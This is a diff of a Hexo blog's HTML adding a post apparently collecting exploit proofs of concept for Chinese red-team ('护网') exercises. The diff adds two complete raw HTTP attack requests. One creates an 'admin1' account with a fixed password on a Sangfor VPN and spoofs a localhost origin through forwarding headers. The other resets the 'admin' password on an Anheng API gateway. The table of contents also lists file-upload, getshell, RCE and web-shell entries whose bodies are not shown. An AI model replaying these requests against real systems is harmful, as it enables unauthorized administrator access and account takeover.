@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="护网poc," />
 
 
 
@@ -79,12 +79,17 @@
 
 
 
-<meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/index.html">
+<meta name="description" content="深信服VPN任意用户添加漏洞参考POC：POST &#x2F;cgi-bin&#x2F;php-cgi&#x2F;html&#x2F;delegatemodule&#x2F;HttpHandler.php?controler&#x3D;User&amp;action&#x3D;AddUser&amp;token&#x3D;e52021a4c9c962ac9cc647effddcf57242d152d9 HTTP&#x2F;1.1Host: xxxxxxCookie: language&#x3D;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hwpoc">
+<meta property="og:url" content="http://example.com/2022/07/30/hwpoc/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="深信服VPN任意用户添加漏洞参考POC：POST &#x2F;cgi-bin&#x2F;php-cgi&#x2F;html&#x2F;delegatemodule&#x2F;HttpHandler.php?controler&#x3D;User&amp;action&#x3D;AddUser&amp;token&#x3D;e52021a4c9c962ac9cc647effddcf57242d152d9 HTTP&#x2F;1.1Host: xxxxxxCookie: language&#x3D;">
 <meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-07-30T07:05:26.000Z">
+<meta property="article:modified_time" content="2022-07-30T08:44:04.681Z">
 <meta property="article:author" content="John Doe">
+<meta property="article:tag" content="护网poc">
 <meta name="twitter:card" content="summary">
 
 
@@ -115,13 +120,13 @@
 
 
 
-  <link rel="canonical" href="http://example.com/"/>
+  <link rel="canonical" href="http://example.com/2022/07/30/hwpoc/"/>
 
 
 
 
 
-  <title>Hexo</title>
+  <title>hwpoc | Hexo</title>
   
 
 
@@ -140,8 +145,7 @@
     
   
 
-  <div class="container sidebar-position-left 
-  page-home">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -214,9 +218,9 @@
         <div class="content-wrap">
           <div id="content" class="content">
             
-  <section id="posts" class="posts-expand">
+
+  <div id="posts" class="posts-expand">
     
-      
 
   
 
@@ -246,9 +250,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2022/07/30/hwpoc/" itemprop="url">hwpoc</a></h1>
+          <h1 class="post-title" itemprop="name headline">hwpoc</h1>
         
 
         <div class="post-meta">
@@ -298,9 +300,7 @@
       
 
       
-        
-          
-            <h4 id="深信服VPN任意用户添加漏洞"><a href="#深信服VPN任意用户添加漏洞" class="headerlink" title="深信服VPN任意用户添加漏洞"></a>深信服VPN任意用户添加漏洞</h4><p>参考POC：<br>POST /cgi-bin/php-cgi/html/delegatemodule/HttpHandler.php?controler=User&amp;action=AddUser&amp;token=e52021a4c9c962ac9cc647effddcf57242d152d9 HTTP/1.1<br>Host: xxxxxx<br>Cookie: language=zh_CN; sinfor_session_id=W730120C88755A7D932019B349CCAC63; PHPSESSID=cb12753556d734509d4092baabfb55dd; x-anti-csrf-gcs=A7DBB1DC0050737E; usermrgstate=%7B%22params%22%3A%7B%22grpid%22%3A%22-1%22%2C%22recflag%22%3A0%2C%22filter%22%3A0%7D%2C%22pageparams%22%3A%7B%22start%22%3A0%2C%22limit%22%3A25%7D%2C%22otherparams%22%3A%7B%22searchtype%22%3A0%2C%22recflag%22%3Afalse%7D%7D; hidecfg=%7B%22name%22%3Afalse%2C%22flag%22%3Afalse%2C%22note%22%3Afalse%2C%22expire%22%3Atrue%2C%22lastlogin_time%22%3Atrue%2C%22phone%22%3Atrue%2C%22allocateip%22%3Atrue%2C%22other%22%3Afalse%2C%22state%22%3Afalse%7D<br>Content-Length: 707<br>Sec-Ch-Ua: “Chromium”;v=”103”, “.Not/A)Brand”;v=”99”<br>Content-Type: application/x-www-form-urlencoded; charset=UTF-8<br>X-Requested-With: XMLHttpRequest<br>Sec-Ch-Ua-Mobile: ?0<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36<br>Sec-Ch-Ua-Platform: “macOS”<br>Accept: <em>/</em><br>Origin: <a target="_blank" rel="noopener" href="https://xxxxxx/">https://xxxxxx</a><br>X-Forwarded-For: 127.0.0.1<br>X-Originating-Ip: 127.0.0.1<br>X-Remote-Ip: 127.0.0.1<br>X-Remote-Addr: 127.0.0.1<br>Sec-Fetch-Site: same-origin<br>Sec-Fetch-Mode: cors<br>Sec-Fetch-Dest: empty<br>Referer: <a target="_blank" rel="noopener" href="https://xxxxxx/html/tpl/userMgt.html?userid=0&amp;groupid=-1&amp;createRole=1">https://xxxxxx/html/tpl/userMgt.html?userid=0&amp;groupid=-1&amp;createRole=1</a><br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br>Connection: close</p>
+        <h4 id="深信服VPN任意用户添加漏洞"><a href="#深信服VPN任意用户添加漏洞" class="headerlink" title="深信服VPN任意用户添加漏洞"></a>深信服VPN任意用户添加漏洞</h4><p>参考POC：<br>POST /cgi-bin/php-cgi/html/delegatemodule/HttpHandler.php?controler=User&amp;action=AddUser&amp;token=e52021a4c9c962ac9cc647effddcf57242d152d9 HTTP/1.1<br>Host: xxxxxx<br>Cookie: language=zh_CN; sinfor_session_id=W730120C88755A7D932019B349CCAC63; PHPSESSID=cb12753556d734509d4092baabfb55dd; x-anti-csrf-gcs=A7DBB1DC0050737E; usermrgstate=%7B%22params%22%3A%7B%22grpid%22%3A%22-1%22%2C%22recflag%22%3A0%2C%22filter%22%3A0%7D%2C%22pageparams%22%3A%7B%22start%22%3A0%2C%22limit%22%3A25%7D%2C%22otherparams%22%3A%7B%22searchtype%22%3A0%2C%22recflag%22%3Afalse%7D%7D; hidecfg=%7B%22name%22%3Afalse%2C%22flag%22%3Afalse%2C%22note%22%3Afalse%2C%22expire%22%3Atrue%2C%22lastlogin_time%22%3Atrue%2C%22phone%22%3Atrue%2C%22allocateip%22%3Atrue%2C%22other%22%3Afalse%2C%22state%22%3Afalse%7D<br>Content-Length: 707<br>Sec-Ch-Ua: “Chromium”;v=”103”, “.Not/A)Brand”;v=”99”<br>Content-Type: application/x-www-form-urlencoded; charset=UTF-8<br>X-Requested-With: XMLHttpRequest<br>Sec-Ch-Ua-Mobile: ?0<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36<br>Sec-Ch-Ua-Platform: “macOS”<br>Accept: <em>/</em><br>Origin: <a target="_blank" rel="noopener" href="https://xxxxxx/">https://xxxxxx</a><br>X-Forwarded-For: 127.0.0.1<br>X-Originating-Ip: 127.0.0.1<br>X-Remote-Ip: 127.0.0.1<br>X-Remote-Addr: 127.0.0.1<br>Sec-Fetch-Site: same-origin<br>Sec-Fetch-Mode: cors<br>Sec-Fetch-Dest: empty<br>Referer: <a target="_blank" rel="noopener" href="https://xxxxxx/html/tpl/userMgt.html?userid=0&amp;groupid=-1&amp;createRole=1">https://xxxxxx/html/tpl/userMgt.html?userid=0&amp;groupid=-1&amp;createRole=1</a><br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br>Connection: close</p>
 <p>name=admin1&amp;note=admin1&amp;passwd=Admin%40123&amp;passwd2=Admin%40123&amp;phone=&amp;grpid=-1&amp;grptext=%2F%E9%BB%98%E8%AE%A4%E7%94%A8%E6%88%B7%E7%BB%84&amp;selectAll=1&amp;b_inherit_auth=1&amp;b_inherit_grpolicy=1&amp;is_Autoip=1&amp;allocateip=0.0.0.0&amp;gqsj=1&amp;ex_time=2027-07-29&amp;is_enable=1&amp;is_public=1&amp;is_pwd=1&amp;first_psw_type=-1&amp;second_server=&amp;auth_type=0&amp;ext_auth_id=&amp;token_svr_id=%E8%AF%B7%E9%80%89%E6%8B%A9&amp;grpolicy_id=0&amp;grpolicytext=%E9%BB%98%E8%AE%A4%E7%AD%96%E7%95%A5%E7%BB%84&amp;roleid=&amp;roletext=&amp;year=&amp;month=&amp;day=&amp;isBindKey=&amp;userid=0&amp;crypto_key=&amp;szcername=&amp;caid=-1&amp;certOpt=0&amp;create_time=&amp;sec_key=&amp;first_psw_name=%E6%9C%AC%E5%9C%B0%E6%95%B0%E6%8D%AE%E5%BA%93&amp;first_psw_id=&amp;second_psw_name=&amp;second_psw_id=&amp;is_extauth=0&amp;secondAuthArr=%5B%5D</p>
 <h4 id="安恒数据大脑-API-网关任意密码重置漏洞"><a href="#安恒数据大脑-API-网关任意密码重置漏洞" class="headerlink" title="安恒数据大脑 API 网关任意密码重置漏洞"></a>安恒数据大脑 API 网关任意密码重置漏洞</h4><p>POC如下：</p>
 <p>POST /q/common-permission/public/users/forgetPassword HTTP/1.1<br>Host: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0<br>Accept-Language: en-US,en;q=0.5<br>Content-type: application/json<br>Accept-Encoding: gzip, deflate<br>Connection: close<br>Upgrade-Insecure-Requests: 1<br>Content-Length: 104<br>{“code”:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX,”rememberMe”:false,”use rname”:”admin”,”password”:”XXXXXXXXXXXXXXXXXXXXXXXXXX”}</p>
@@ -330,8 +330,6 @@
 <p>Txxxb的前台未授权反序列化漏洞:</p>
 <p>天眼系统命令执行0day漏洞</p>
 
-          
-        
       
     </div>
     
@@ -346,265 +344,36 @@
 
     <footer class="post-footer">
       
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/05/31/test/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2021/05/31/test/" itemprop="url">test</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-05-31T15:56:32+08:00">
-                2021-05-31
-              </time>
-            
-
-            
-
-            
-          </span>
-
+        <div class="post-tags">
           
-
+            <a href="/tags/%E6%8A%A4%E7%BD%91poc/" rel="tag"># 护网poc</a>
           
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
         </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="12321"><a href="#12321" class="headerlink" title="12321"></a>12321</h2>
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
       
 
       
       
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
       
 
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/05/31/hello-world/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2021/05/31/hello-world/" itemprop="url">Hello World</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
             
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-05-31T11:43:27+08:00">
-                2021-05-31
-              </time>
+              <a href="/2021/05/31/test/" rel="next" title="test">
+                <i class="fa fa-chevron-left"></i> test
+              </a>
             
+          </div>
 
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
             
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
+          </div>
         </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
       
 
       
-        
-          
-            <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
       
     </footer>
   </div>
@@ -614,10 +383,11 @@
   </article>
 
 
-    
-  </section>
 
-  
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -625,6 +395,10 @@
 
 
           
+
+  
+
+
 
         </div>
         
@@ -645,8 +419,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -697,6 +480,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B7%B1%E4%BF%A1%E6%9C%8DVPN%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.</span> <span class="nav-text">深信服VPN任意用户添加漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%89%E6%81%92%E6%95%B0%E6%8D%AE%E5%A4%A7%E8%84%91-API-%E7%BD%91%E5%85%B3%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.</span> <span class="nav-text">安恒数据大脑 API 网关任意密码重置漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#360-%E5%A4%A9%E6%93%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-number">3.</span> <span class="nav-text">360 天擎任意文件上传</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%87%E6%88%B7-OA-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="nav-number">4.</span> <span class="nav-text">万户 OA 文件上传漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B3%9B%E5%BE%AE-OA-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-workrelate-plan-util-uploaderOperate-jsp-%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="nav-number">5.</span> <span class="nav-text">泛微 OA 文件上传 &#x2F;workrelate&#x2F;plan&#x2F;util&#x2F;uploaderOperate.jsp 存在文件上传漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B3%9B%E5%BE%AEOA-defaultroot-officeserverservlet-%EF%BC%9A"><span class="nav-number">6.</span> <span class="nav-text">泛微OA &#x2F;defaultroot&#x2F;officeserverservlet ：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B3%9B%E5%BE%AE%E5%BE%AE-eoffice10-%E5%89%8D%E5%8F%B0-getshell%EF%BC%88eoffice10-version-json%EF%BC%89"><span class="nav-number">7.</span> <span class="nav-text">泛微微 eoffice10 前台 getshell（eoffice10&#x2F;version.json）:</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%93%9D%E5%87%8COA%E6%8E%88%E6%9D%83RCE%E5%92%8C%E6%9C%AA%E6%8E%88%E6%9D%83RCE"><span class="nav-number">8.</span> <span class="nav-text">蓝凌OA授权RCE和未授权RCE</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Fofa%E6%90%9C%E7%B4%A2%E8%B5%84%E4%BA%A7"><span class="nav-number">9.</span> <span class="nav-text">Fofa搜索资产</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#URL"><span class="nav-number">10.</span> <span class="nav-text">URL</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#H3C-CAS%E4%BA%91%E8%AE%A1%E7%AE%97%E5%B9%B3%E5%8F%B0%E5%88%86%E5%B8%83%E5%BC%8F%E5%AD%98%E5%82%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E8%AF%BB%E5%8F%96"><span class="nav-number">11.</span> <span class="nav-text">H3C CAS云计算平台分布式存储管理系统任意用户密码读取</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A4%A9%E8%9E%8D%E4%BF%A1-%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="nav-number">12.</span> <span class="nav-text">天融信 - 上网行为管理系统 一句话木马</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -830,6 +629,10 @@
   
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
